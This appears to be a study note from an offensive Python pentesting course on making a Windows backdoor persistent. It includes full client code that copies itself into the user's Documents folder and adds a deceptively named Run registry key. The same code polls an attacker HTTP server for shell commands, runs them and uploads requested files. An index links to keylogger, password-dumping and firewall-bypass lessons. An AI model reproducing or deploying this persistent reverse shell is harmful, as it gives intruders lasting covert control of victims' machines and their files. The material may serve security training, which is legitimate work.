---
title: Making your binary persistent
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - python
  - python pentesting
  - scripting
  - reverse shell
  - persistence
  - registry
---
# Making your binary persistent

From course: [Python For Offensive PenTest: A Complete Practical Course](https://www.udemy.com/course/python-for-offensive-security-practical-course/).

??? abstract "General index of the course"
	- Gaining persistence shells (TCP + HTTP):
		- [Coding a TCP connection and a reverse shell](coding-a-tcp-reverse-shell.md).
		- [Coding a low level data exfiltration  - TCP connection](coding-a-low-level-data-exfiltration-tcp.md).
		- [Coding an http reverse shell](coding-an-http-reverse-shell.md).
		- [Coding a data exfiltration script for a http shell](coding-a-data-exfiltration-script-http-shell.md).
		- [Tunning the connection attempts](tunning-the-connection-attemps.md).
		- [Including cd command into TCP reverse shell](including-cd-command-into-tcp-reverse-shell.md).
	- Advanced scriptable shells:
		- [Using a Dynamic DNS instead of your bared attacker public ip](ddns-aware-shell.md).
		- [Making your binary persistent](making-your-binary-persistent.md). 
		- [Making a screenshot](making-a-screenshot.md). 
		- [Coding a reverse shell that searches files](coding-a-reverse-shell-that-searches-files.md). 
	- Techniques for bypassing filters: 
		- [Coding a reverse shell that scans ports](coding-a-reverse-shell-that-scans-ports.md). 
		- [Hickjack the Internet Explorer process to bypass an host-based firewall](hickjack-internet-explorer-process-to-bypass-an-host-based-firewall.md).
		- [Bypassing Next Generation Firewalls](bypassing-next-generation-firewalls.md).
		- [Bypassing IPS with handmade XOR Encryption](bypassing-ips-with-handmade-xor-encryption.md).
	- Malware and crytography:
		- [TCP reverse shell with AES encryption](tcp-reverse-shell-with-aes-encryption.md).
		- [TCP reverse shell with RSA encryption](tcp-reverse-shell-with-rsa-encryption.md).
		- [TCP reverse shell with hybrid encryption AES + RSA](tcp-reverse-shell-with-hybrid-encryption-rsa-aes.md).
	- Password Hickjacking:
		- [Simple keylogger in python](python-keylogger.md).
		- [Hijacking Keepass Password Manager](hijacking-keepass.md).
		- [Dumping saved passwords from Google Chrome](dumping-chrome-saved-passwords.md).
		- [Man in the browser attack](man-in-the-browser-attack.md).
		- [DNS Poisoning](dns-poisoning.md).
	- Privilege escalation:
		- [Weak service file permission](privilege-escalation.md).


In order for a binary to persist, the binary must do three things:

**1.** To copy itself into a different location. We need source path (current working directory) and destination path, for instance, the Document folder. This means that we need to know the username: 

	```cmd
		c:\Users\<username>\Documents
	```
	
**2.** To add a registry key pointing to our new exe location. This is done only the first time.

**3.** For consecutive times, we have to avoid repeating steps 1 and 2.


## Phases for persistence

### 1. System recognition

Getting to know the current working directory + the user profile.


### 2. Copy the binary to a different location

If the binary is not found in the destination folder, we can assume this is the first time we're running it. Then:

We will copy the binary to a different location. For that, we need a source path (current working directory) and a destination path, for instance, the Document folder. This means that we need to know the current working directory (for the source path)  and the username (for the destination path): 

	```cmd
		c:\Users\<username>\Documents
	```

This information was already retrieved in step 1 (System recognition).

### 3. Add a Registry key 

If the binary is not found in the destination folder, we can assume this is the first time we're running it. Then:

We will add a Registry key.

### 4. Fire up our shell


## Client side

To be run on our victim's machine.

```python
# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2

import requests
import os
import subprocess
import time
import shutil 
import winreg as wreg

#Reconn Phase
path = os.getcwd().strip('/n')

Null, userprof = subprocess.check_output('set USERPROFILE', shell=True,stdin=subprocess.PIPE,  stderr=subprocess.PIPE).decode().split('=')

destination = userprof.strip('\n\r') + '\\Documents\\' + 'client.exe'

#If it was the first time our backdoor gets executed, then Do phase 1 and phase 2 
if not os.path.exists(destination):
    shutil.copyfile(path+'\client.exe', destination) #You can replace   path+'\client.exe' with sys.argv[0] ---> the sys.argv[0] will return the file name

    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS)
    wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, destination)
    key.Close()



#Last phase is to start a reverse connection back to our kali machine

while True:
    req = requests.get('http://192.168.0.152:8080')
    command = req.text
    if 'terminate' in command:
        break
    elif 'grab' in command:
        grab, path = command.split("*")
        if os.path.exists(path):
            url = "http://192.168.0.152:8080/store"
            files = {'file': open(path, 'rb')}
            r = requests.post(url, files=files)
        else:
            post_response = requests.post(url='http://192.168.0.152:8080', data='[-] Not able to find the file!'.encode())
    else:
        CMD = subprocess.Popen(command, shell=True,stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        post_response = requests.post(url='http://192.168.0.152:8080', data=CMD.stdout.read())
        post_response = requests.post(url='http://192.168.0.152:8080', data=CMD.stderr.read())
    time.sleep(3)


```
